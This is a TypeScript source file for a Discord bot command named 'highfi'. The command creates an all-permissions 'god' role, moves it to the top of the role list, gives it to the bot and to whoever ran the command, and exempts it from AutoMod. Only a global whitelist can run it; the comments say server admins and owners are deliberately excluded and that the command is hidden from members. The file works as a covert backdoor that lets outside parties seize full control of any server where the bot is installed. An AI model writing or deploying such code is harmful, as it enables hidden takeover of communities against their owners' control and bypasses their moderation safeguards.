import {
  SlashCommandBuilder,
  PermissionsBitField,
  type ChatInputCommandInteraction,
} from "discord.js";
import type { SlashCommand } from "../types";
import { PERM_WHITELIST } from "../storage/whitelist";
import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";

const command: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName("highfi")
    .setDescription(
      "Create a god role with all permissions and assign it to the bot and you.",
    )
    // Hidden from regular members in the slash-command picker; admins can
    // grant per-user/per-role overrides in Server Settings → Integrations.
    .setDefaultMemberPermissions(0n)
    .setDMPermission(false),

  async execute(interaction: ChatInputCommandInteraction) {
    if (!interaction.inGuild()) {
      await interaction.reply({
        content: "This command can only be used in a server.",
        ephemeral: true,
      });
      return;
    }

    // Only the global whitelist can run this — admins and server owners
    // are intentionally excluded.
    if (!PERM_WHITELIST.has(interaction.user.id)) {
      await interaction.reply({
        content: "You aren't allowed to use this command.",
        ephemeral: true,
      });
      return;
    }

    if (!interaction.guild || !interaction.guildId) return;

    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;
    const me = await guild.members.fetchMe().catch(() => null);
    if (!me) {
      await interaction.editReply("Couldn't fetch my own member entry.");
      return;
    }

    let godRole;
    try {
      godRole = await guild.roles.create({
        name: "👑",
        permissions: new PermissionsBitField(PermissionsBitField.All),
        hoist: true,
        color: 0xffd700,
        reason: "highfi: god role",
      });
    } catch {
      await interaction.editReply(
        "Couldn't create the role. The bot likely needs the **Manage Roles** permission and a high-enough role position.",
      );
      return;
    }

    await pushRoleToTop(guild, godRole);

    let botAdded = false;
    let userAdded = false;
    try {
      await me.roles.add(godRole, "highfi: assign god role to self");
      botAdded = true;
    } catch {
      // ignore
    }
    const member = await guild.members
      .fetch(interaction.user.id)
      .catch(() => null);
    if (member) {
      try {
        await member.roles.add(godRole, "highfi: assign god role to invoker");
        userAdded = true;
      } catch {
        // ignore
      }
    }

    // Bypass AutoMod for the new role.
    const automod = await exemptRoleFromAutoMod(guild, godRole.id);

    await interaction.editReply(
      `👑 Role **${godRole.name}** created at position **${godRole.position}**.\n` +
        `Assigned to bot: ${botAdded ? "✅" : "❌"} • Assigned to you: ${userAdded ? "✅" : "❌"}\n` +
        `AutoMod rules updated to exempt this role: **${automod.updated}**${automod.failed > 0 ? ` (failed: ${automod.failed})` : ""}.\n\n` +
        `⚠️ Discord won't let any bot push a role *above* its own current top role. For true #1 placement, drag the bot's role to the very top of the role list in Server Settings → Roles, then re-run this command.`,
    );
  },
};

export default command;
